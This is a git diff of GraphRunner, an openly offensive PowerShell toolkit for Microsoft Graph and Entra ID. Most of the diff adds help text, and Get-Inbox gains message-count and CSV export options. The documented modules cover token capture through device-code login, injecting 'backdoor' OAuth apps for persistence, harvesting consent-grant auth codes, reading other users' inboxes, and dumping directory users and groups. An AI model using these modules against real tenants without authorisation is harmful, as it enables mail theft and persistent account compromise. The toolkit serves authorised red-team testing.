@@ -7,10 +7,31 @@ Write-Host -ForegroundColor green "
                  Do service principals dream of electric sheep?
                        
 For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
+To list GraphRunner modules run List-GraphRunnerModules
 "
 
 
 function Get-GraphTokens{
+    <#
+        .SYNOPSIS
+        Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)     
+    
+    .EXAMPLE
+        
+        C:\PS> Get-GraphTokens
+        Description
+        -----------
+        This command will initiate a device code auth where you can authenticate the terminal from an already authenticated browser session.
+     #>
+
     param(
         [switch]$ExternalCall
     )
@@ -92,7 +113,28 @@ function Get-GraphTokens{
 }
 
 function Invoke-RefreshGraphTokens{
+    <#
+        .SYNOPSIS
+        Access tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Access tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.    
     
+    .EXAMPLE
+        
+        C:\PS> Invoke-RefreshGraphTokens
+        Description
+        -----------
+        This command will use the refresh token in the $tokens variable to execute a token refresh.
+    
+
+    #>
+
     if(!$tokens){
         write-host -ForegroundColor red '[*] No tokens found in the $tokens variable. Use the Get-GraphTokens module to authenticate first.'
     break
@@ -149,7 +191,6 @@ function Invoke-InjectOAuthApp{
         
         The display name of the App Registration. This is what will be displayed on the consent page.
     
-    
     .PARAMETER ReplyUrl
         
         The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
@@ -171,10 +212,10 @@ function Invoke-InjectOAuthApp{
     
     .EXAMPLE
         
-        C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "https://windefend.azurewebsites.net" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
+        C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "http://localhost:10000" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
         Description
         -----------
-        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. 
+        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. Also, by specifying the reply url as running on localhost you can use the Invoke-AutoOAuthFlow module to spin up a web server on the localhost for capturing the auth code during consent flow.
 #>
   Param(
 
@@ -389,6 +430,35 @@ $resources = @"
 
 
 function Invoke-DeleteOAuthApp{
+    <#
+     .SYNOPSIS
+        Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.
+
+    .PARAMETER Tokens
+
+        Provide an already authenticated access token. 
+
+    .PARAMETER ObjectID
+
+        The Object ID of the app registration you want to delete.
+    
+    .EXAMPLE
+        
+        C:\PS> Invoke-DeleteOAuthApp
+        Description
+        -----------
+        This command will delete the specified app registration from the tenant.
+
+    #>
+
     param(
         [Parameter(Position = 0, Mandatory = $True)]
         [object[]]
@@ -415,6 +485,36 @@ function Invoke-DeleteOAuthApp{
 }
 
 Function Invoke-GraphOpenInboxFinder{
+    <#
+    .SYNOPSIS
+
+        A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.
+
+    .PARAMETER Tokens
+
+        Provide an already authenticated access token. 
+
+    .PARAMETER UserList
+
+        Userlist of users to check (one per line)
+    
+    .EXAMPLE
+        
+        C:\PS> Invoke-GraphOpenInboxFinder -Tokens $tokens -UserList userlist.txt
+        Description
+        -----------
+        Using this module will attempt to access each inbox in the userlist file as the current user. 
+
+    #>
+
     param(
     [Parameter(Position = 0, Mandatory = $true)]
     [object[]]
@@ -464,29 +564,69 @@ Function Invoke-GraphOpenInboxFinder{
 
 
 Function Get-AzureAppTokens{
+    <#
+        .SYNOPSIS
 
-Param
-(
-    [Parameter(Position = 0, Mandatory = $true)]
-    [string]
-    $Scope = "",
+        This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
 
-    [Parameter(Position = 1, Mandatory = $true)]
-    [string]
-    $ClientID = "",
+    .DESCRIPTION
+        
+       This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.
 
-    [Parameter(Position = 2, Mandatory = $true)]
-    [string]
-    $ClientSecret = "",
+    .PARAMETER ClientId
 
-    [Parameter(Position = 3, Mandatory = $true)]
-    [string]
-    $RedirectUri = "",
+        The Client ID (AppID) of the App
 
-    [Parameter(Position = 4, Mandatory = $true)]
-    [string]
-    $AuthCode = ""
-)
+    .PARAMETER ClientSecret
+
+        The secret of the app
+    
+    .PARAMETER RedirectUri
+
+        The Redirect URI used in the authorization request
+    
+    .PARAMETER Scope
+
+        Permission scope of the app "Mail.Read openid etc"
+    
+    .PARAMETER AuthCode
+
+        The authorization code retrieved from the request sent to the redirect URI during the OAuth flow
+
+    .EXAMPLE
+        
+        C:\PS> Get-AzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -AuthCode "0.AUYAME_74EXAMPLEUZSUBZqrWXZOtU7Jh4..."
+        -----------
+        This will authenticate as an app registration (service principal) while completing an OAuth flow using the AuthCode provided. This would be useful in a situation where you have harvested an OAuth code during a consent grant flow.
+    
+    #>
+
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $Scope = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $ClientID = "",
+
+        [Parameter(Position = 2, Mandatory = $true)]
+        [string]
+        $ClientSecret = "",
+
+        [Parameter(Position = 3, Mandatory = $true)]
+        [string]
+        $RedirectUri = "",
+
+        [Parameter(Position = 4, Mandatory = $true)]
+        [string]
+        $AuthCode = ""
+    )
 
     $body = @{client_id=$ClientID
     scope=$Scope
@@ -516,6 +656,13 @@ Param
 }
 
 Function Invoke-CheckAccess{
+    <#
+        .SYNOPSIS 
+            
+            A simple module for checking Graph access.
+
+    #>
+
     param(
     [Parameter(Position = 0, Mandatory = $true)]
     [object[]]
@@ -528,6 +675,48 @@ Function Invoke-CheckAccess{
 }
 
 Function Invoke-RefreshAzureAppTokens{
+    <#
+     .SYNOPSIS
+
+        This module refreshes an Azure App token.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       This module refreshes an Azure App token.
+
+    .PARAMETER ClientId
+
+        The Client ID (AppID) of the App
+
+    .PARAMETER ClientSecret
+
+        The secret of the app
+    
+    .PARAMETER RedirectUri
+
+        The Redirect URI used in the authorization request
+    
+    .PARAMETER Scope
+
+        Permission scope of the app "Mail.Read openid etc"
+    
+    .PARAMETER RefreshToken
+
+        A refresh token associated with the app
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-RefreshAzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -RefreshToken "0.AUYAME_75cEXAMPLEUBZqrWd22WdOz..."
+        -----------
+        This will refresh your Azure app tokens.
+
+    #>
+
+    
 Param
 (
     [Parameter(Position = 0, Mandatory = $false)]
@@ -570,6 +759,42 @@ Param
 
 
 Function Invoke-AutoOAuthFlow{
+    <#
+        .SYNOPSIS
+
+        Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.
+
+    .PARAMETER ClientId
+
+        The Client ID (AppID) of the App
+
+    .PARAMETER ClientSecret
+
+        The secret of the app
+    
+    .PARAMETER RedirectUri
+
+        The Redirect URI used in the authorization request
+    
+    .PARAMETER Scope
+
+        Permission scope of the app "Mail.Read openid etc"
+    
+    .EXAMPLE
+        
+        C:\PS> Invoke-AutoOAuthFlow -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "http://localhost:10000" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read"
+        -----------
+        This will spin up a webserver on your localhost port 10000 to catch the auth code during consent grant.
+
+    #>
     Param
     (
     [Parameter(Position = 0, Mandatory = $true)]
@@ -620,27 +845,141 @@ Function Invoke-AutoOAuthFlow{
 }
 
 Function Get-Inbox{
+    <#
+    .SYNOPSIS
+
+        This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER userId
+
+        Email address of the mailbox you want to read
+    
+    .PARAMETER TotalMessages
+
+        Default is 25, Max is 1000
+    
+    .PARAMETER OutFile
+
+        File to output the results to
+    
+    .EXAMPLE
+        
+        C:\PS> Get-Inbox -Tokens $tokens -userid deckard@tyrellcorporation.io -TotalMessages 50 -OutFile emails.csv
+        -----------
+        This will connect to the specified userid's inbox and pull the latest 50 messages. 
+
+    #>
     param(
-    [Parameter(Position = 0, Mandatory = $true)]
+    [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
     $Tokens = "",
-    [Parameter(Position = 0, Mandatory = $true)]
+    [Parameter(Position = 1, Mandatory = $true)]
     [string]
-    $userid = ""
+    $userid = "",
+    [Parameter(Position = 2, Mandatory = $false)]
+    [string]
+    $TotalMessages = "25",
+    [Parameter(Position = 3, Mandatory = $false)]
+    [string]
+    $OutFile = ""
     )
+    if($Tokens){
+            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
+    }
+    else{
+         # Login
+         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
+         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
+         while($auth -notlike "Yes"){
+                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
+                $answer = Read-Host 
+                $answer = $answer.ToLower()
+                if ($answer -eq "yes" -or $answer -eq "y") {
+                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
+                    $tokens = Get-GraphTokens -ExternalCall
+                    $auth = "Yes"
+                } elseif ($answer -eq "no" -or $answer -eq "n") {
+                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
+                    return
+                } else {
+                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
+                }
+            }
+    }
+    $access_token = $tokens.access_token   
+    [string]$refresh_token = $tokens.refresh_token 
 
-    $access_token = $Tokens.access_token
-
-    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
+    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
     $out = $request.Content | ConvertFrom-Json
+    $resultsList = @()
+    foreach ($hit in $out.value) {
+            $subject = $hit.subject
+            $sender = $hit.sender.emailAddress.address
+            $receivers = $hit.toRecipients.emailAddres.address
+            $date = $hit.sentDateTime
+            $preview = $hit.bodyPreview
+            $body = $hit.body.content
 
-    $out.value
-
-
+            $LogInfo = @{
+                        "Subject" = $subject
+                        "Sender" = $sender
+                        "Receivers" = $receivers
+                        "Date" = $date
+                        "Body" = $body
+                    }
+    
+            $resultsList += New-Object PSObject -Property $LogInfo
+            Write-Output "Subject: $subject | Sender: $sender | Receivers: $($receivers -join ', ') | Date: $date | Message Preview: $preview"
+            Write-Output ("=" * 80) 
+            }
+    if($OutFile){
+        Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
+        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
+    }
 }
 
 
 Function Get-AzureADUsers{
+    <#
+    .SYNOPSIS
+
+        Gather the full list of users from the directory.        
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Gather the full list of users from the directory.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER OutFile
+
+        File to output the results to
+    
+    .EXAMPLE
+        
+        C:\PS> Get-AzureADUsers -Tokens $tokens -OutFile users.txt
+        -----------
+        This will dump all Azure AD users to a text file called users.txt 
+
+    #>
     param(
     [Parameter(Position = 0, Mandatory = $true)]
     [object[]]
@@ -1208,6 +1547,29 @@ Function Invoke-DumpApps{
 
 
 function Get-SecurityGroups{
+    <#
+    .SYNOPSIS
+
+        Gather the security groups and members from the directory.        
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Gather the security groups and members from the directory.
+
+    .PARAMETER AccessToken
+
+        Pass the $tokens.access_token global variable after authenticating to this parameter
+
+    .EXAMPLE
+        
+        C:\PS> Get-SecurityGroups -AccessToken $tokens.access_token
+        -----------
+        This will dump all security groups.
+    #>
     param (
             [string] $AccessToken,
             [switch] $GraphRun
@@ -1409,7 +1771,31 @@ function Invoke-InviteGuest{
 
     .DESCRIPTION
         
-       Invites a guest user to an Azure Active Directory tenant.
+        Invites a guest user to an Azure Active Directory tenant.
+
+    .PARAMETER Tokens
+
+        Token object for auth
+
+    .PARAMETER DisplayName
+    
+        The name you want displayed in the Azure directory for the user (ex. "Beau Bullock")
+        
+    .PARAMETER EmailAddress
+    
+        The email address of the user you want to invite
+        
+    .PARAMETER RedirectUrl 
+    
+        A redirect url that you want to redirect the guest to upon accepting the invite. Leave blank to use the default
+        
+    .PARAMETER SendInvitationMessage
+    
+        Option to send an email to the invited user or not
+        
+    .PARAMETER CustomMessageBody
+    
+        Change the message body sent in the invite 
 
     .EXAMPLES      
         
@@ -1636,10 +2022,10 @@ function Invoke-GraphRecon{
     }
     }
 
-# Generate unique GUIDs
-$messageId = [guid]::NewGuid()
-$trackingHeader = [guid]::NewGuid()
-$clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"
+    # Generate unique GUIDs
+    $messageId = [guid]::NewGuid()
+    $trackingHeader = [guid]::NewGuid()
+    $clientId = "50afce61-c917-435b-8c6d-60aa5a8b8aa7"
 
 
 
@@ -1677,21 +2063,21 @@ $soapRequest = @"
 </s:Envelope>
 "@
 
-if(!$GraphRun){
-    Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
-}
-# Send the SOAP request to the provisioningwebservice
-$response = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest
+    if(!$GraphRun){
+        Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
+    }
+    # Send the SOAP request to the provisioningwebservice
+    $response = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest
 
 
-if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
-    $dataBlob = $Matches[1]
-} else {
-    Write-Host "DataBlob not found in the response."
-}
+    if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
+        $dataBlob = $Matches[1]
+    } else {
+        Write-Host "DataBlob not found in the response."
+    }
 
-$messageID = [guid]::NewGuid()
-$trackingHeader = [guid]::NewGuid()
+    $messageID = [guid]::NewGuid()
+    $trackingHeader = [guid]::NewGuid()
 
 $GetCompanyInfoSoapRequest = @"
 <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
@@ -1731,99 +2117,127 @@ $GetCompanyInfoSoapRequest = @"
 </s:Envelope>
 "@
 
-$companyinfo = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest
+    $companyinfo = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest
 
 
-$xml = [xml]$companyInfo
+    $xml = [xml]$companyInfo
 
-# Define namespaces
-$ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
-$ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
-$ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
-$ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
-$ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
-$ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")
-
-
-# Extract data using XPath
-$displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
-$street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
-$city = $xml.SelectSingleNode("//c:City", $ns).InnerText
-$state = $xml.SelectSingleNode("//c:State", $ns).InnerText
-$postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
-$Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
-$TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
-$Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
-$InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
-$DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
-$DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
-$DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
-$DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
-$PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
-$PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
-$UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
-$UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
-$UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
-$UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText
-
-if(!$GraphRun){
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-Write-Host -ForegroundColor Yellow "Main Contact Info"
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-}
-# Display the extracted data
-Write-Output "Display Name: $displayName"
-Write-Output "Street: $street"
-Write-Output "City: $city"
-Write-Output "State: $state"
-Write-Output "Postal Code: $postalCode"
-Write-Output "Country: $country"
-Write-Output "Technical Notification Email: $TechnicalContact"
-Write-Output "Telephone Number: $Telephone"
-if(!$GraphRun){
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-Write-Host -ForegroundColor Yellow "Directory Sync Settings"
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-}
-Write-Output "Initial Domain: $initialDomain"
-Write-Output "Directory Sync Enabled: $dirSync"
-Write-Output "Directory Sync Status: $dirSyncStatus"
-Write-Output "Directory Sync Client Machine: $dirSyncClientMachine"
-Write-Output "Directory Sync Service Account: $dirSyncServiceAccount"
-Write-Output "Password Sync Enabled: $passwordSync"
-if(!$GraphRun){
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-Write-Host -ForegroundColor Yellow "User Settings"
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-}
-Write-Output "Self-Service Password Reset Enabled: $passwordReset"
-Write-Output "Users Can Consent to Apps: $UsersPermToConsent"
-Write-Output "Users Can Read Other Users: $UsersPermToReadUsers"
-Write-Output "Users Can Create Apps: $UsersPermToCreateLOBApps"
-Write-Output "Users Can Create Groups: $UsersPermToCreateGroups"
+    # Define namespaces
+    $ns = New-Object Xml.XmlNamespaceManager($xml.NameTable)
+    $ns.AddNamespace("s", "http://www.w3.org/2003/05/soap-envelope")
+    $ns.AddNamespace("b", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration.WebService")
+    $ns.AddNamespace("c", "http://schemas.datacontract.org/2004/07/Microsoft.Online.Administration")
+    $ns.AddNamespace("d", "http://schemas.microsoft.com/2003/10/Serialization/Arrays")
+    $ns.AddNamespace("ns", "http://schemas.microsoft.com/online/serviceextensions/2009/08/ExtensibilitySchema.xsd")
 
 
-# Select the ServiceParameter nodes
-$serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)
-if(!$GraphRun){
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-Write-Host -ForegroundColor Yellow "Additional Service Parameters"
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-}
-# Loop through each ServiceParameter node and extract the Name and Value
-foreach ($parameter in $serviceParameters) {
-    $name = $parameter.Name
-    $value = $parameter.Value
-    Write-Output "$name : $value"
-}
-if(!$GraphRun){
-Write-Host -ForegroundColor Yellow ("=" * 80) 
-}
+    # Extract data using XPath
+    $displayName = $xml.SelectSingleNode("//c:DisplayName", $ns).InnerText
+    $street = $xml.SelectSingleNode("//c:Street", $ns).InnerText
+    $city = $xml.SelectSingleNode("//c:City", $ns).InnerText
+    $state = $xml.SelectSingleNode("//c:State", $ns).InnerText
+    $postalCode = $xml.SelectSingleNode("//c:PostalCode", $ns).InnerText
+    $Country = $xml.SelectSingleNode("//c:CountryLetterCode", $ns).InnerText
+    $TechnicalContact = $xml.SelectSingleNode("//c:TechnicalNotificationEmails", $ns).InnerText
+    $Telephone = $xml.SelectSingleNode("//c:TelephoneNumber", $ns).InnerText
+    $InitialDomain = $xml.SelectSingleNode("//c:InitialDomain", $ns).InnerText
+    $DirSync = $xml.SelectSingleNode("//c:DirectorySynchronizationEnabled", $ns).InnerText
+    $DirSyncStatus = $xml.SelectSingleNode("//c:DirectorySynchronizationStatus", $ns).InnerText
+    $DirSyncClientMachine = $xml.SelectSingleNode("//c:DirSyncClientMachineName", $ns).InnerText
+    $DirSyncServiceAccount = $xml.SelectSingleNode("//c:DirSyncServiceAccount", $ns).InnerText
+    $PasswordSync = $xml.SelectSingleNode("//c:PasswordSynchronizationEnabled", $ns).InnerText
+    $PasswordReset = $xml.SelectSingleNode("//c:SelfServePasswordResetEnabled", $ns).InnerText
+    $UsersPermToConsent = $xml.SelectSingleNode("//c:UsersPermissionToUserConsentToAppEnabled", $ns).InnerText
+    $UsersPermToReadUsers = $xml.SelectSingleNode("//c:UsersPermissionToReadOtherUsersEnabled", $ns).InnerText
+    $UsersPermToCreateLOBApps = $xml.SelectSingleNode("//c:UsersPermissionToCreateLOBAppsEnabled", $ns).InnerText
+    $UsersPermToCreateGroups = $xml.SelectSingleNode("//c:UsersPermissionToCreateGroupsEnabled", $ns).InnerText
+
+    if(!$GraphRun){
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    Write-Host -ForegroundColor Yellow "Main Contact Info"
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    }
+    # Display the extracted data
+    Write-Output "Display Name: $displayName"
+    Write-Output "Street: $street"
+    Write-Output "City: $city"
+    Write-Output "State: $state"
+    Write-Output "Postal Code: $postalCode"
+    Write-Output "Country: $country"
+    Write-Output "Technical Notification Email: $TechnicalContact"
+    Write-Output "Telephone Number: $Telephone"
+    if(!$GraphRun){
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    Write-Host -ForegroundColor Yellow "Directory Sync Settings"
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    }
+    Write-Output "Initial Domain: $initialDomain"
+    Write-Output "Directory Sync Enabled: $dirSync"
+    Write-Output "Directory Sync Status: $dirSyncStatus"
+    Write-Output "Directory Sync Client Machine: $dirSyncClientMachine"
+    Write-Output "Directory Sync Service Account: $dirSyncServiceAccount"
+    Write-Output "Password Sync Enabled: $passwordSync"
+    if(!$GraphRun){
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    Write-Host -ForegroundColor Yellow "User Settings"
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    }
+    Write-Output "Self-Service Password Reset Enabled: $passwordReset"
+    Write-Output "Users Can Consent to Apps: $UsersPermToConsent"
+    Write-Output "Users Can Read Other Users: $UsersPermToReadUsers"
+    Write-Output "Users Can Create Apps: $UsersPermToCreateLOBApps"
+    Write-Output "Users Can Create Groups: $UsersPermToCreateGroups"
+
+
+    # Select the ServiceParameter nodes
+    $serviceParameters = $xml.SelectNodes("//ns:ServiceParameter", $ns)
+    if(!$GraphRun){
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    Write-Host -ForegroundColor Yellow "Additional Service Parameters"
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    }
+    # Loop through each ServiceParameter node and extract the Name and Value
+    foreach ($parameter in $serviceParameters) {
+        $name = $parameter.Name
+        $value = $parameter.Value
+        Write-Output "$name : $value"
+    }
+    if(!$GraphRun){
+    Write-Host -ForegroundColor Yellow ("=" * 80) 
+    }
 }
 
 
 
 function Invoke-SearchUserAttributes{
+    <#
+     .SYNOPSIS
+
+        This module will query user attributes from the directory and search through them for a specific term.       
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       This module will query user attributes from the directory and search through them for a specific term.
+
+    .PARAMETER Tokens
+
+        Token object for auth
+
+    .PARAMETER SearchTerm
+
+        The term you want to search across user attributes
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "password"
+        -----------
+        This will search every user attribute for the term password.
+
+    #>
     Param(
 
     [Parameter(Position = 0, Mandatory = $False)]
@@ -1908,6 +2322,45 @@ function Invoke-SearchUserAttributes{
 }
 
 Function Invoke-SearchMailbox{
+    <#
+    .SYNOPSIS
+
+        This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox.    
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       This module uses the Graph search API to search for specific terms in emails and allows the user to download them including attachments. This only works for the current user. Use Get-Inbox if accessing a different inbox. 
+
+    .PARAMETER Tokens
+
+        Token object for auth
+
+    .PARAMETER SearchTerm
+
+        The term you want to search for in the mailbox.
+
+    .PARAMETER MessageCount
+
+        The amount of messages returned in the search results (default = 25)
+
+    .PARAMETER OutFile
+
+        File to output a list of emails to
+
